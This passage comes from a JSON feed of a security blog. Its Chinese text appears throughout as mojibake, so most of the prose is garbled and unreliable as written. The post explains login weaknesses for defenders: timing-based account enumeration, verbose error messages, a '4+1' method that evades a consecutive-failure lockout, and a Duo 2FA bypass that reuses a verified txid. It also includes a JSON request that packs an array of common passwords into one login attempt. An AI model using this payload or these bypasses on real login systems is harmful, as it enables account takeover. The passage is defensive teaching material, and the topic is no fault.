å…ˆæŸ¥å¸³è™Ÿå†æŸ¥å¯†ç¢¼</h3>\n<p>å…ˆæŸ¥å¸³è™Ÿå†æŸ¥å¯†ç¢¼çœ‹ä¼¼åˆç†ï¼Œç•¢ç«Ÿé€™æ¨£æ‰èƒ½è·Ÿç”¨æˆ¶èªªåˆ°åº•æ˜¯å“ªä¸€å€‹æ‰“éŒ¯äº†å˜›ï¼ä½†é€™å€‹åšæ³•å…¶å¯¦ä¹Ÿé€éœ²çµ¦é§­å®¢ï¼šä¸€å€‹å¸³è™Ÿå­˜ä¸å­˜åœ¨ï¼Œè·ŸæŸ¥å¹¾æ¬¡è³‡æ–™åº«æœ‰é—œã€‚è€Œå¤§å®¶æ‡‰è©²éƒ½çŸ¥é“æŸ¥è©¢è³‡æ–™åº«å…¶å¯¦æ˜¯å¾ˆèŠ±æ™‚é–“çš„ï¼Œæ‰€ä»¥åœ¨å‡è¨­å…¶ä»–ç¨‹å¼é‚è¼¯éƒ½ç›¸åŒçš„æƒ…æ³ä¸‹ï¼ŒæŸ¥å…©æ¬¡è³‡æ–™åº«è·ŸæŸ¥ä¸€æ¬¡æ‡‰è©²æœ‰å›è¦†é€Ÿåº¦ä¸Šæ˜é¡¯çš„å·®ç•°ã€‚</p>\n<p>å› æ­¤ï¼Œå¦‚æœæˆ‘æ‹¿ä¸€ç™¾å€‹å¸³è™Ÿå»å˜—è©¦ç™»å…¥ï¼Œçµæœç™¼ç¾å…¶ä¸­ä¸€å€‹é é¢å›è¦†çš„çš„æ™‚é–“æ˜¯å…¶ä»–çš„å…©å€ï¼Œé‚£æˆ‘å°±å¯ä»¥æ¨è«–ï¼Œé€™å€‹å¸³è™Ÿæ—¢ç„¶ç”¨äº†å…©æ¬¡è³‡æ–™åº«æŸ¥è©¢ï¼Œé‚£ä»–æ‡‰è©²æ˜¯å­˜åœ¨çš„å§ï¼Ÿ</p>\n<p>åˆ©ç”¨é€™å€‹ç‘•ç–µï¼Œé§­å®¢å°±å¯ä»¥æ‹¿ä¸€å€‹å¾ˆå¤§çš„å¸³è™Ÿåå–®é€ä¸€å˜—è©¦ç™»å…¥ï¼Œç„¶å¾Œé€éå›è¦†é€Ÿåº¦åˆ¤æ–·è³‡æ–™åº«è£¡é¢å­˜åœ¨å“ªäº›å¸³è™Ÿï¼Œå†åˆ©ç”¨éæ¿¾å®Œçš„å¸³è™Ÿåå–®ç¬¬äºŒæ¬¡æš´åŠ›ç ´è§£ä½¿ç”¨å¼±å¯†ç¢¼çš„ç”¨æˆ¶ã€‚ä¸å‡ºæ„å¤–ï¼Œå°æ˜ç”¨çš„å¾Œå°ç®¡ç†å¸³è™Ÿåç¨±å°±æ˜¯æœ€ç›´è§€çš„ adminï¼Œç•¶ç„¶ä¸€ä¸‹å°±è¢«å­—å…¸æª”ç™¼ç¾å•¦ï¼</p>\n<h3 id=\"%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF%E5%A4%AA%E6%98%8E%E7%A2%BA\"><a class=\"direct-link\" href=\"#%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF%E5%A4%AA%E6%98%8E%E7%A2%BA\">#</a> éŒ¯èª¤è¨Šæ¯å¤ªæ˜ç¢º</h3>\n<p>å°æ˜æƒ±äº†ï¼Œdebug message ä¸æ¸…ä¸æ¥šæˆä½•é«”çµ±ï¼Œä½¿ç”¨è€…æ€éº¼çŸ¥é“å“ªè£¡æ‰“éŒ¯ï¼Ÿæ²’éŒ¯ï¼Œç•¶ä½ æŠŠéŒ¯èª¤è¨Šæ¯å¯«å¾—è¶Šç²¾ç¢ºï¼Œä½ è¼•é¬†ã€ä½¿ç”¨è€…è¼•é¬†ã€é§­å®¢æ›´è¼•é¬†ã€‚ä»–ç”šè‡³ä¹Ÿä¸ç”¨ç®¡å¯¦ä½œé‚è¼¯æ˜¯ä¸æ˜¯æœƒæœ‰å›æ‡‰é€Ÿåº¦ä¸Šçš„å·®ç•°ï¼Œåªè¦å–®ç´”æ ¹æ“šéŒ¯èª¤è¨Šæ¯å°±çŸ¥é“åˆ°åº•æ˜¯å¸³è™ŸéŒ¯é‚„æ˜¯å¯†ç¢¼éŒ¯ï¼Œè¼•è¼•é¬†é¬†åˆ—èˆ‰æ‰€æœ‰çš„å¸³è™Ÿï¼</p>\n<p>å¾è³‡å®‰çš„è§€é»ä¾†è¬›ï¼ŒéŒ¯èª¤è¨Šæ¯æ‡‰è©²ç›¡å¯èƒ½ç± çµ±ï¼Œä¾‹å¦‚ä»»ä½•ç™»å…¥éŒ¯èª¤éƒ½ç”¨ã€å¸³è™Ÿå¯†ç¢¼éŒ¯èª¤ã€æˆ–ã€æ‚¨è¼¸å…¥çš„è³‡è¨Šæœ‰èª¤ã€å¸¶éï¼Œè®“é§­å®¢æ›´é›£åˆ¤æ–·æ”»æ“Šæ˜¯å¦æˆåŠŸã€‚</p>\n<h3 id=\"%E6%B2%92%E6%9C%89%E4%BB%BB%E4%BD%95%E7%99%BB%E5%85%A5%E9%99%90%E5%88%B6\"><a class=\"direct-link\" href=\"#%E6%B2%92%E6%9C%89%E4%BB%BB%E4%BD%95%E7%99%BB%E5%85%A5%E9%99%90%E5%88%B6\">#</a> æ²’æœ‰ä»»ä½•ç™»å…¥é™åˆ¶</h3>\n<p>æœ€å¤§çš„å•é¡Œï¼Œå°±æ˜¯æ²’æœ‰é‡å°ã€å˜—è©¦ç™»å…¥ã€é€™å€‹èˆ‰å‹•åšä»»ä½•é™åˆ¶ï¼å› ç‚ºä»»ä½•äººéƒ½å¯ä»¥è¼•æ˜“åœ°å°ç¶²ç«™åšç„¡é™å¤šæ¬¡çš„ç™»å…¥å˜—è©¦ï¼Œæ¦‚å¿µä¸Šå°±åƒè²·æ¨‚é€ä¸€æ¨£ï¼Œä½ æŠŠæ¯ä¸€ç¨®å¯èƒ½çš„çµ„åˆéƒ½åŒ…ç‰Œè²·ä¸‹ä¾†ç¸½æ˜¯æœƒä¸­å¤§ççš„å§ï¼Ÿé‚£ç‚ºä»€éº¼æˆ‘å€‘é‚„è¦åŠªåŠ›å·¥ä½œï¼Œä¸èƒ½èµ°é€²å½©åˆ¸è¡Œå¤§æ‰‹ä¸€æ®å…¨åŒ…ä¸‹ä¾†ï¼Ÿå› ç‚ºåŒ…ç‰Œçš„æˆæœ¬é è¶…éä¸­ççš„çé‡‘ï¼Œé€™å€‹è¡Œç‚ºçš„æœŸæœ›å€¼å¤ªä½äº†ï¼Œä¸å€¼å¾—æˆ‘å€‘é€™æ¨£åšã€‚</p>\n<blockquote>\n<p>åŒç†ï¼Œå°æš´åŠ›ç ´è§£ä¾†èªªï¼Œæœ€æ ¹æœ¬çš„è§£æ±ºæ–¹æ³•å°±æ˜¯å¢åŠ é§­å®¢çš„æˆæœ¬ï¼Œè®“ä»–è¦èŠ±çš„æ™‚é–“è·Ÿè³‡æºå¤§åˆ°æš´åŠ›ç ´è§£è®Šå¾—ä¸å¯è¡Œï¼Œå°±èƒ½æœ‰æ•ˆæŠµæ“‹é€™ç¨®æ”»æ“Šã€‚</p>\n</blockquote>\n<p>è½äº†é˜¿æŸšçš„è§£èªªï¼Œå°æ˜æ‰“é–‹ log ä¸€çœ‹ï¼Œç™¼ç¾å¾ä¸€å€‹ IP 12.34.56.78 ç™¼äº†å°‡è¿‘ç™¾è¬å€‹ç™»å…¥çš„ requestï¼Œç¬é–“æç„¶å¤§æ‚Ÿã€é‚£æˆ‘åªè¦é™åˆ¶æ¯å€‹ IP å¦‚æœé€£çºŒäº”æ¬¡è«‹æ±‚éƒ½æ‰“éŒ¯å¯†ç¢¼å°±é–å¸³è™Ÿï¼Œé€™æ¨£å°±å¯ä»¥äº†å§ï¼ã€ã€‚</p>\n<p>é˜¿æŸšæƒ³äº†æƒ³ï¼Œå†æ–æ–é ­ï¼Œé€™å€‹åšæ³•é‚„æ˜¯æœ‰é‚è¼¯éŒ¯èª¤ã€‚</p>\n<h3 id=\"%E7%99%BB%E5%85%A5%E9%82%8F%E8%BC%AF%E9%8C%AF%E8%AA%A4\"><a class=\"direct-link\" href=\"#%E7%99%BB%E5%85%A5%E9%82%8F%E8%BC%AF%E9%8C%AF%E8%AA%A4\">#</a> ç™»å…¥é‚è¼¯éŒ¯èª¤</h3>\n<p>å› ç‚ºé–å¸³è™Ÿçš„é‚è¼¯æ˜¯ã€é€£çºŒäº”æ¬¡éŒ¯èª¤ã€ï¼Œæ‰€ä»¥é§­å®¢å¯ä»¥å…ˆè¨»å†Šä¸€çµ„å¸³è™Ÿï¼Œç„¶å¾Œæ¯è©¦å››æ¬¡å°±æˆåŠŸç™»å…¥è‡ªå·±çš„å¸³è™Ÿä¸€æ¬¡ï¼Œæ‰“ç ´ã€é€£çºŒã€çš„æ¢ä»¶ï¼Œé€™æ¨£ 4+1 çš„æ–¹æ³•ä¸æ–·é‡è¤‡ä¸€æ¨£å¯ä»¥ç¹éå°æ˜çš„é™åˆ¶é”åˆ°æš´åŠ›ç ´è§£ã€‚å†è€…ï¼Œå¦‚æœæ˜¯åœ¨å¸³è™Ÿå¯†ç¢¼åˆ†é–‹æŸ¥è©¢è³‡æ–™åº«çš„å¯¦ä½œä¸‹ï¼Œé§­å®¢é‚„å¯ä»¥ç”¨ 4+1 æ­é…å‰é¢æéçš„æ™‚é–“åˆ¤æ–·æ³•ä¾†åˆ—èˆ‰å¹³å°ä¸Šçš„å¸³è™Ÿã€‚å› æ­¤ä»¥ä¾†æº IP ç‚ºåˆ¤æ–·å°è±¡é–å¸³è™Ÿçš„é‚è¼¯å…¶å¯¦ç„¡æ³•é˜»æ­¢é§­å®¢çš„æ”»æ“Šã€‚</p>\n<p>è€Œä¸”çœ¼å°–çš„é˜¿æŸšé‚„ç™¼ç¾ï¼Œç™»å…¥ç”¨çš„ POST è«‹æ±‚å±…ç„¶å…è¨±ä½¿ç”¨ JSON æ ¼å¼çš„ post dataï¼š</p>\n<pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span><br>    <span class=\"token property\">\"username\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token property\">\"password\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"password\"</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™æ¨£æ ¹æœ¬ä¸ç”¨ç™¼å¤§é‡è«‹æ±‚ï¼Œåªè¦æŠŠå¤§é‡çš„å¯†ç¢¼å€‘ä¸€æ¬¡ç”¨ array çš„æ–¹å¼é€éå»ï¼Œå¦‚æœè£¡é¢æœ‰ä¸€çµ„æ­£ç¢ºçš„å°±å¯ä»¥ç›´æ¥ç™»å…¥å•¦ï¼</p>\n<pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span><br>    <span class=\"token property\">\"username\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token property\">\"password\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><br>        <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"pass123\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"iloveyou\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"letmein\"</span><br>        ...<br>    <span class=\"token punctuation\">]</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å°æ˜æ²‰æ€è¨±ä¹…ï¼Œè¦è€ƒæ…®çš„äº‹æƒ…çœŸå¤šå‘€ï¼ä¸åªè¦çœ‹ç™»å…¥æ ¼å¼ï¼Œé‚„è¦é™åˆ¶æ¯å€‹å¸³æˆ¶ç™»å…¥å¤±æ•—å¹¾æ¬¡å°±è¦é–ä½ï¼Œè€Œä¸”éŒ¯èª¤è¨Šæ¯è·Ÿè³‡æ–™åº«æŸ¥è©¢æ–¹å¼éƒ½è¦èª¿æ•´ï¼ŒçœŸæ˜¯å¤§å·¥ç¨‹ã€‚</p>\n<p>ä¸éæ—¢ç„¶é ­éƒ½æ´—ä¸‹å»äº†ï¼Œä¸å¦‚å†çµ¦ä»–åšå€‹æœ€è¿‘æ­£æµè¡Œçš„ 2FA å§ï¼</p>\n<h3 id=\"2fa\"><a class=\"direct-link\" href=\"#2fa\">#</a> 2FA</h3>\n<p>2FA (2 factor authentication) ç¿»è­¯ç‚ºé›™å› ç´ é©—è­‰ï¼Œä¹Ÿå°±æ˜¯è¼¸å…¥æ­£ç¢ºçš„å¸³è™Ÿå¯†ç¢¼å¾Œé‚„å¿…é ˆé€é email æˆ–ç°¡è¨Šçš„æ–¹å¼å†é©—è­‰ä¸€æ¬¡ï¼Œéƒ½éäº†æ‰ç®—ç™»å…¥æˆåŠŸã€‚å»£ç¾©ä¾†èªªç‚ºä¸€ç¨® MFA (multiple factor authentication)ï¼Œæˆ–å¤šå› ç´ é©—è­‰ï¼Œç‚ºäº†é˜²æ­¢å–®ä¸€é©—è­‰æ–¹æ³•è¢«ç ´è§£è€Œå»¶ä¼¸çš„å¤šå±¤é˜²ç·šæˆ°è¡“ã€‚</p>\n<p>è¦åšç•¶ç„¶å¥½ï¼Œé˜¿æŸšèªªï¼Œä½†å¯¦ä½œä¸Šä¹Ÿæ˜¯è¦å¤šæ³¨æ„å‘€ï¼</p>\n<p>å…ˆå‰æ–°èä¸Šï¼ˆ <a href=\"https://news.thewindowsclub.com/hackers-could-bypass-cpanel-2fa-104264/\">Hackers could bypass cPanel 2FA in minutes using brute-force attacks</a> ï¼‰æ‰å ±å°è»Ÿé«”å› ç‚º 2FA é©—è­‰ç¢¼æ²’æœ‰é™åˆ¶æäº¤çš„æ™‚é–“è·Ÿæ¬¡æ•¸ï¼Œå°è‡´é§­å®¢å¯ä»¥åœ¨å¹¾åˆ†é˜å…§æš´åŠ›ç ´è§£åƒ… 4 å€‹æ•¸å­—çµ„æˆçš„é©—è­‰ç¢¼ã€‚</p>\n<blockquote>\n<p>è¦åšå¥½ 2FA å¿…é ˆåŠ ä¸Šä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚é©—è­‰ç¢¼æœ‰æ•ˆçš„æ™‚é–“ä¸æ‡‰éé•·ã€é©—è­‰ç¢¼æ‡‰éš¨æ©Ÿç„¡æ³•é æ¸¬ã€è¦æ±‚è¼¸å…¥éŒ¯èª¤ä¸‰æ¬¡å°±è¦é‡æ–°å‚³é€é©—è­‰ç¢¼ç­‰ç­‰ã€‚</p>\n</blockquote>\n<p>å¦å¤–ï¼Œè¼¸å…¥é©—è­‰ç¢¼å¾Œçš„ API ä¹Ÿæ‡‰åšå¥½ä¿è­·ã€‚ä¾‹å¦‚æ›¾æœ‰ç¶²ç«™åœ¨é©—è­‰ç¢¼æ¯”å°æˆåŠŸå¾Œå°å¾Œç«¯ç™¼é€ <code>/auth/2fa?verify=true</code> ä¾†è¡¨ç¤ºé©—è­‰æˆåŠŸï¼Œæˆ–ç”šè‡³ç›´æ¥è·³è½‰ <code>/myaccount/</code> é€²åˆ°ç™»å…¥å¾Œé é¢ï¼Œé€™æ™‚ API é‚è¼¯æ ¹æœ¬èˆ‡ 2FA ç„¡é—œï¼Œé§­å®¢æ ¹æœ¬å¯ä»¥å¿½ç•¥é©—è­‰ç¢¼ï¼Œç›´æ¥ç™¼åŒæ¨£çš„ API å°±å¯ä»¥ç™»å…¥å•¦ï¼</p>\n<p>æˆ–æ˜¯ä¸ä¹…å‰ <a href=\"https://portswigger.net/daily-swig/researchers-trick-duo-2fa-into-sending-authentication-request-to-attacker-controlled-device\">Researchers trick Duo 2FA into sending authentication request to attacker-controlled device</a> å ±å°äº† 2FA é©—è­‰æ™‚çš„ state èˆ‡ç•¶å‰å˜—è©¦ç™»å…¥çš„ session ç„¡é—œï¼Œå°è‡´é§­å®¢å¯ä»¥ç”¨è‡ªå·±ç™»å…¥æ™‚ 2FA é©—è­‰çš„ state å–ä»£æ­£åœ¨å˜—è©¦ç ´è§£çš„ 2FA é©—è­‰ï¼Œå°è‡´ç³»çµ±èª¤ä»¥ç‚ºå—å®³è€…çš„è£ç½®å·²æ¥å—é©—è­‰ã€‚</p>\n<p>æœ¬ä¾†çš„æ©Ÿåˆ¶æ˜¯ï¼šè¼¸å…¥å¸³è™Ÿå¯†ç¢¼å¾Œæœƒè§¸ç™¼ 2FA é©—è­‰æµç¨‹ï¼Œé¦–å…ˆæœƒç™¼é€ä¸‹åœ–ä¸­ç¬¬ä¸€å€‹è«‹æ±‚ <code>POST /frame/prompt</code>ï¼Œå…¶ä¸­ <code>sid</code> ä»£è¡¨çš„æ˜¯ç•¶å‰çš„ session idã€‚é€™æ™‚ä¼ºæœå™¨æœƒå›å‚³ <code>txid</code>ï¼Œè®“ç¶²é ç«¯å¯ä»¥æŒçºŒæŸ¥è©¢ï¼ˆpollï¼‰ 2FA é©—è­‰çš„ç‹€æ…‹ï¼Œä¾‹å¦‚æ˜¯å¦å·²å‚³é€é€šçŸ¥ã€ä½¿ç”¨è€…é©—è­‰äº†æ²’ç­‰è³‡è¨Šï¼Œä¾†åˆ¤æ–·ç™»å…¥æ˜¯å¦æˆåŠŸã€‚åœ¨ç¶²é é¦–æ¬¡è«‹æ±‚ <code>POST /frame/status</code> æ™‚ï¼Œä¼ºæœå™¨æ‰æœƒå°ä½¿ç”¨è€…çš„æ‰‹æ©Ÿç™¼é€æ¨æ’­é€šçŸ¥ï¼Œå¼•å°ä½¿ç”¨è€…é€²è¡Œç¬¬äºŒæ¬¡é©—è­‰ã€‚ç›´åˆ°æ‰‹æ©Ÿç«¯é»æ“Šç¢ºèªï¼Œä¼ºæœå™¨æ›´æ”¹äº†é©—è­‰ç‹€æ…‹ï¼Œç¶²é ç«¯æ‰æœƒåœ¨ä¸‹ä¸€æ¬¡æŸ¥è©¢æ™‚å¾—åˆ° <code>txid</code> ç‹€æ…‹ç‚º allow çš„çµæœï¼Œå®Œæˆé©—è­‰ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/authentication/duo-mechanism.png\" /><figcaption><p>Duo security app mechanism</p>\n</figcaption></figure></p>\n<p>é‚£é§­å®¢æ˜¯å¦‚ä½•ç¹éçš„å‘¢ï¼Ÿ</p>\n<p>å•é¡Œå‡ºåœ¨è¾¨è­˜èº«ä»½çš„ <code>sid</code> è·Ÿè¾¨è­˜ 2FA é©—è­‰ç‹€æ…‹çš„ <code>txid</code> é€™å…©å€‹ä¸¦æ²’æœ‰é—œè¯ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œæˆ‘ä»Šå¤©åªè¦æ‹¿ä¸€å€‹å·²ç¶“é©—è­‰æˆåŠŸçš„ <code>txid</code> æ­é…ä»»æ„æˆ‘æƒ³è¦èªè­‰çš„ <code>sid</code>ï¼Œç³»çµ±æ ¹æœ¬åˆ†ä¸å‡ºä¾†é€™å€‹ç‹€æ…‹æ˜¯ä¸æ˜¯å±¬æ–¼é€™å€‹èº«ä»½ï¼Œå°±åƒç•¢æ¥­è­‰æ›¸ä¸Šå¦‚æœæ²’æœ‰å¯«åå­—ï¼Œé‚£ä»»ä½•äººéƒ½å¯ä»¥æ‹¿é€™å¼µç´™èªªè‡ªå·±ç•¢æ¥­äº†ã€‚</p>\n<p>å¦‚ä¸‹åœ–ï¼Œé§­å®¢åªè¦è‡ªå·±æ“æœ‰ä¸€å€‹å¸³è™Ÿä¸¦ä¸”çŸ¥é“å—å®³è€…çš„å¸³è™Ÿå¯†ç¢¼ï¼Œå°±å¯ä»¥ç”¨è‡ªå·±é©—è­‰æˆåŠŸçš„ <code>txid</code> æ­é…ç”¨å—å®³è€…å¸³å¯†å˜—è©¦ç™»å…¥çš„ <code>sid</code> ä¾†é¨™éç³»çµ±å®Œæˆé©—è­‰ã€‚ä½ å¯ä»¥åœ¨é€™è£¡æ‰¾åˆ°æ›´è©³ç´°çš„ <a href=\"https://sensepost.com/blog/2021/duo-two-factor-authentication-bypass/\">writeup</a>ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/authentication/duo-bypass.png\" /><figcaption><p>2FA bypass</p>\n</figcaption></figure></p>\n<h2 id=\"%E9%82%A3%E6%88%91%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E6%88%91%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%EF%BC%9F\">#</a> é‚£æˆ‘è©²æ€éº¼é˜²ï¼Ÿ</h2>\n<p>å°æ˜è½äº†é€™éº¼å¤šæ—©å·²æšˆé ­è½‰å‘ï¼Œåˆ°åº•è©²åšåˆ°å“ªäº›æ©Ÿåˆ¶æˆ–éµå®ˆå“ªäº›æº–å‰‡å‘¢ï¼Ÿ</p>\n<p>å°æ˜è·Ÿé˜¿æŸšç¶“éä¸€ç•ªè¨è«–ï¼Œåˆ—å‡ºäº†ä¸€ç³»åˆ—æ³¨æ„äº‹é …ï¼š</p>\n<ul>\n<li>ç¢ºä¿ç™»å…¥è³‡æ–™å¿…é ˆç¶“ç”± HTTPS åŠ å¯†é€šé“å‚³é€</li>\n<li>ä¸è¦åœ¨é©—è­‰å®Œæˆå‰çš„ response ä¸­é€éœ²ç™»å…¥è€…çš„ username æˆ–æ˜¯ email ç­‰è³‡è¨Š</li>\n<li>é˜²æ­¢é§­å®¢è‡ªå‹•åŒ–æš´åŠ›ç ´è§£ï¼š\n<ul>\n<li>ç™»å…¥å¤±æ•—çš„éŒ¯èª¤è¨Šæ¯æ‡‰è©²ç›¡å¯èƒ½ç± çµ±è€Œå–®ä¸€ï¼Œä¸è¦éæ–¼è©³ç´°</li>\n<li>é˜²æ­¢é§­å®¢é€éå›è¦†é€Ÿåº¦æˆ–æ˜¯é é¢ä¸­çš„è³‡è¨Šåˆ¤åˆ¥æŸå€‹å¸³è™Ÿæ˜¯å¦å­˜åœ¨ç³»çµ±ä¸­</li>\n<li>æ‡‰é™åˆ¶å¸³æˆ¶å¯å˜—è©¦ç™»å…¥çš„æ¬¡æ•¸ï¼Œä¾‹å¦‚é–å¸³æˆ¶æˆ–æ˜¯éœ€ç­‰å¾…ä¸€æ®µæ™‚é–“æ‰èƒ½å˜—è©¦</li>\n<li>åŒæ™‚å¯ä»¥åš IP-based rate limiting é™åˆ¶è«‹æ±‚ç™¼é€é€Ÿç‡</li>\n<li>åŠ å…¥å…¶ä»–é˜²è‡ªå‹•åŒ–çš„æ©Ÿåˆ¶ï¼Œå¦‚ CAPTCHA</li>\n</ul>\n</li>\n<li>ç¢ºä¿ç¨‹å¼é‚è¼¯æ²’æœ‰æ¼æ´ï¼ˆåŒ…å«ç™»å…¥ã€å¯†ç¢¼é‡ç½®ã€å¤šå› ç´ é©—è­‰ç­‰ç­‰ï¼‰</li>\n<li>å¹«åŠ©ä½¿ç”¨è€…è¨­å®šå¼·ä¸€äº›çš„å¯†ç¢¼ï¼Œä¾‹å¦‚ JavaScript å‡½å¼åº« zxcvbn æœƒåœ¨ä½¿ç”¨è€…å»ºç«‹å¸³è™Ÿæ™‚é€²è¡Œæª¢æŸ¥ï¼Œç¦æ­¢ä½¿ç”¨è€…é¸æ“‡å¼·åº¦ä¸è¶³çš„å¯†ç¢¼ã€‚é›–ç„¶ä¸ä»£è¡¨å¯†ç¢¼ä¸€å®šå®‰å…¨ï¼Œä½†è‡³å°‘æœƒç¬¦åˆä¸€å®šå¼·åº¦çš„å¯†ç¢¼è¦å‰‡ï¼Œä¾‹å¦‚ï¼šè‡³å°‘å…«å€‹å­—å…ƒã€éœ€ä½¿ç”¨å¤§å°å¯«èˆ‡ç‰¹æ®Šç¬¦è™Ÿã€ä¸èƒ½è·Ÿå¸³è™Ÿé¡ä¼¼ç­‰ç­‰ã€‚</li>\n</ul>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>çœ‹ä¼¼ç°¡å–®åˆå¸¸è¦‹çš„ç™»å…¥åŠŸèƒ½ï¼Œå…¶å¯¦ç´°ç¯€ä¸­è—è‘—éå¸¸å¤šçš„é­”é¬¼ã€‚å°¤å…¶å¤§å¤šæ•¸æ¯”è¼ƒæ•æ„Ÿçš„å‹•ä½œè·Ÿè³‡è¨Šéƒ½è¦å…ˆç¶“éç™»å…¥æ‰èƒ½å­˜å–ï¼Œå¦‚æœé€£é€™å€‹å®ˆé–€äººéƒ½ä¸å¯é ï¼Œé‚£å¯èªªæ˜¯é–€æˆ¶å¤§é–‹å‘€ï¼é€²è¡Œèº«ä»½é©—è­‰æ™‚ï¼Œå‹™å¿…å¤šæª¢æŸ¥æ˜¯å¦èƒ½æŠµæª”é§­å®¢çš„æš´åŠ›ç ´è§£ä»¥åŠæ˜¯å¦å­˜åœ¨é‚è¼¯ä¸Šçš„ç¼ºå¤±ï¼Œè¶Šé—œéµçš„åŠŸèƒ½è¶Šæ˜¯éœ€è¦å¤šå±¤é˜²è­·ã€‚</p>\n<p>è¢«ç›œå¸³è™Ÿæ˜¯èª°çš„éŒ¯å‘¢ï¼Ÿæƒ³æƒ³ä½ éƒ½ç”¨å“ªäº›å¯†ç¢¼è·Ÿæœå‹™å§ï¼Œè¦æ˜¯ä½ è¨»å†Šä»»ä½•æœå‹™éƒ½ç”¨åŒæ¨£å¹¾çµ„å¯†ç¢¼ï¼Œåˆä½¿ç”¨ä¸€äº›å®‰å…¨ç­‰ç´šå ªæ†‚çš„ç¶²ç«™ï¼Œå¯è¦å°å¿ƒå›‰ï¼</p>\n",
      "date_published": "2021-09-16T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/",
      "title": "è³‡å®‰å¼±é»æœƒé€ æˆå¤šå¤§æå¤± ?",
      "content_html": "<h1 id=\"%E8%B3%87%E5%AE%89%E5%BC%B1%E9%BB%9E%E6%9C%83%E9%80%A0%E6%88%90%E5%A4%9A%E5%A4%A7%E6%90%8D%E5%A4%B1-%3F\"><a class=\"direct-link\" href=\"#%E8%B3%87%E5%AE%89%E5%BC%B1%E9%BB%9E%E6%9C%83%E9%80%A0%E6%88%90%E5%A4%9A%E5%A4%A7%E6%90%8D%E5%A4%B1-%3F\">#</a> è³‡å®‰å¼±é»æœƒé€ æˆå¤šå¤§æå¤± ?</h1>\n<p><img src=\"/img/posts/nick/cybersecurity-loss/cl_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<p>ç•¶ç¢°åˆ°è³‡å®‰å•é¡Œæ™‚ï¼Œæœƒé¦¬ä¸Šè·Ÿè‘—é‡åˆ°å¦ä¸€å€‹é›£é¡Œï¼Œå°±æ˜¯é€™å€‹å•é¡Œåˆ°åº•è¦ä¸è¦ä¿® ? å°±åƒå¾—æ„Ÿå†’çš„æ™‚å€™å¯èƒ½æœƒè€ƒæ…®ä¸åƒè—¥å¿ä¸€å¿ï¼Œè³­è‡ªå·±çš„èº«é«”å¤ å¥åº·ï¼Œä½†å¦‚æœä¸­çš„æ˜¯ Covid-19 è‚¯å®šä¸æœƒçŒ¶è±«è¦ä¸è¦è²·è—¥ï¼Œåªæœƒæ“”å¿ƒè²·ä¸åˆ°è—¥ï¼Œç•¢ç«Ÿå…©è€…çš„åš´é‡æ€§å·®å¤ªå¤šäº†ã€‚</p>\n<!-- summary -->\n<p>åš´é‡æ€§æ˜¯åœ¨ç™¼ç¾å•é¡Œæ™‚æ±ºå®šè¦ä¸è¦è™•ç†çš„é—œéµï¼Œé€™é€šå¸¸ç”±ç™¼ç”Ÿæ©Ÿç‡èˆ‡å½±éŸ¿ç¨‹åº¦ä¾†æ±ºå®šï¼Œæœ¬æ–‡è¦å¸¶å¤§å®¶è©¦è‘—å¾å¦å¤–ä¸€å€‹è§’åº¦ä¾†çœ‹ï¼Œå¾éå»è³‡å®‰äº‹ä»¶é€ æˆçš„æå¤±ä¾†è©•ä¼°å•é¡Œçš„åš´é‡æ€§ã€‚</p>\n<!-- summary -->\n<h2 id=\"%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\"><a class=\"direct-link\" href=\"#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90\">#</a> è³‡æ–™ä¾†æº</h2>\n<p>åœ¨åˆ†æä¹‹å‰å…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹å¼•ç”¨çš„è³‡æ–™çš„ä¾†æºï¼Œå› ç‚ºè³‡å®‰äº‹ä»¶ä¸­åŒ…å«å¾ˆå¤šæ•æ„Ÿè³‡è¨Šï¼Œä¸€èˆ¬çš„ç‹€æ³ä¸‹å–å¾—è©³ç´°è³‡æ–™è¼ƒç‚ºå›°é›£ã€‚</p>\n<ul>\n<li>æ©Ÿæ§‹åç¨±: IC3(Internet Crime Complaint Center)</li>\n<li>å®˜æ–¹ç¶²å€: <a href=\"https://www.ic3.gov/\">https://www.ic3.gov/</a></li>\n<li>ç°¡ä»‹:<br>\nIC3 æ˜¯ è¯é‚¦èª¿æŸ¥å±€ (FBI) æ——ä¸‹çš„çµ„ç¹”ï¼Œä¹Ÿæ˜¯ç¾åœ‹æœ€å¤§çš„è³‡å®‰é€šå ±ç³»çµ±ï¼Œä¸»è¦æä¾›ä¸€å€‹å¯é ã€æ–¹ä¾¿çš„å ±å‘Šæ©Ÿåˆ¶ï¼Œä»¥ä¾¿å‘è¯é‚¦èª¿æŸ¥å±€(FBI) 